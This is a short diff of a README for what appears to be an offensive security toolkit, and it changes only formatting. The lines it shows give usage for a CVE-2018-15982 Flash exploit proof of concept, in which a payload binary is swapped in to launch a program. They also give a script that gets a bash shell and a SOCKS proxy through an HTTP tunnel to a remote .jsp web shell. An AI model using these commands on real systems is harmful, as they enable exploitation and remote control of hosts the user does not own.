@@ -50,10 +50,9 @@ node checkUrl.js -h
 ```
 ## New features
 ```
-# how use exploit CVE-2018-15982 ?
-```
+# how use exploit CVE-2018-15982
+
 py2 tools/replaceBin.py -i /mysvn/CVE-2018-15982_PoC.swf -o /mysvn/test.swf -c 'notepad.exe'
-```
 
 # get bash shell,socks4 through http tunnel,auto use tmux and reGeorgSocksProxy.py
 tools/getBashShell_proxychains_http_tunnel.sh http://xxx:9002/uddi/.O01542895480635.jsp
